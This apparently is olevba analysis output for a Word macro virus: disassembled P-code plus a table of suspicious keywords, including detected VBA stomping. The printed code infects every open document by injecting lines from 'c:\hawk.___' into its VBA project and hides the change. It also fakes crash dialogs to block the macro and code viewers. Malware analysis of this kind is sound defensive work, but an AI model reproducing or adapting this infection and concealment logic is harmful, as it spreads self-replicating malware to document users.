' 	ArgsMemCallWith Execute 0x0003 
' Line #169:
' 	EndWith 
' Line #170:
' 	Ld wdParagraph 
' 	ParamNamed Unit 
' 	LitDI2 0x0001 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemLd Not 0x0002 
' 	ArgsMemCall Set 0x0000 
' Line #171:
' 	Ld Selection 
' 	ArgsMemCall Delete 0x0000 
' Line #172:
' 	EndIfBlock 
' Line #173:
' Line #174:
' 	Ld Documents 
' 	MemLd Count 
' 	St CountofDocs 
' Line #175:
' 	StartForVariable 
' 	Ld Doc 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld CountofDocs 
' 	For 
' Line #176:
' 	LitDI2 0x0001 
' 	Ld Doc 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "ThisDoc"
' 	Ne 
' 	IfBlock 
' Line #177:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld Doc 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set t 
' Line #178:
' 	Ld Doc 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Saved 
' 	St s 
' Line #179:
' 	LitDI2 0x0001 
' 	St begin 
' Line #180:
' 	LitStr 0x000F "Document_Open()"
' 	Ld begin 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CoundOfLines 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #181:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #182:
' 	Ld begin 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #183:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	NextVar 
' Line #184:
' 	LitStr 0x0010 "Document_Close()"
' 	Ld begin 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CoundOfLines 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (True)
' 	Eq 
' 	ElseIfBlock 
' Line #185:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #186:
' 	Ld begin 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #187:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	NextVar 
' Line #188:
' 	ElseBlock 
' Line #189:
' 	LitDI2 0x0001 
' 	St begin 
' Line #190:
' 	LitStr 0x000C "ToolsMacro()"
' 	Ld begin 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CoundOfLines 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #191:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #192:
' 	Ld begin 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #193:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	NextVar 
' Line #194:
' 	ElseBlock 
' Line #195:
' 	LitDI2 0x0001 
' 	St begin 
' Line #196:
' 	LitStr 0x000F "Filetemplates()"
' 	Ld begin 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CoundOfLines 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #197:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #198:
' 	Ld begin 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #199:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	NextVar 
' Line #200:
' 	ElseBlock 
' Line #201:
' 	LitDI2 0x0001 
' 	St begin 
' Line #202:
' 	LitStr 0x000C "ViewVBCode()"
' 	Ld begin 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CoundOfLines 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #203:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #204:
' 	Ld begin 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #205:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	NextVar 
' Line #206:
' 	EndIfBlock 
' Line #207:
' 	EndIfBlock 
' Line #208:
' 	EndIfBlock 
' Line #209:
' 	EndIfBlock 
' Line #210:
' Line #211:
' 	LitStr 0x000B "c:\hawk.___"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #212:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo q 
' 	EndIf 
' Line #213:
' 	LitDI2 0x0001 
' 	St i 
' Line #214:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #215:
' 	LitDI2 0x0001 
' 	Ld a 
' 	LineInput 
' Line #216:
' 	Ld i 
' 	Ld a 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #217:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #218:
' 	Loop 
' Line #219:
' 	Label q 
' Line #220:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #221:
' 	LitStr 0x0007 "ThisDoc"
' 	Ld t 
' 	MemSt New 
' Line #222:
' 	Ld Doc 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld Doc 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #223:
' 	Ld Doc 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Saved 
' 	Ld s 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld s 
' 	Ld Doc 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Saved 
' 	EndIf 
' Line #224:
' 	EndIfBlock 
' Line #225:
' 	StartForVariable 
' 	Ld Doc 
' 	EndForVariable 
' 	NextVar 
' Line #226:
' Line #227:
' 	EndSub 
' Line #228:
' Line #229:
' 	FuncDefn (Private Sub ToolsMacro())
' Line #230:
' 	LitStr 0x0043 "This program has performed an illegal operation and will shut down."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #231:
' 	EndSub 
' Line #232:
' Line #233:
' 	FuncDefn (Private Sub Filetemplates())
' Line #234:
' 	LitStr 0x0043 "This program has performed an illegal operation and will shut down."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #235:
' 	EndSub 
' Line #236:
' Line #237:
' 	FuncDefn (Private Sub ViewVBCode())
' Line #238:
' 	LitStr 0x0043 "This program has performed an illegal operation and will shut down."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #239:
' 	EndSub 
' Line #240:
' Line #241:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

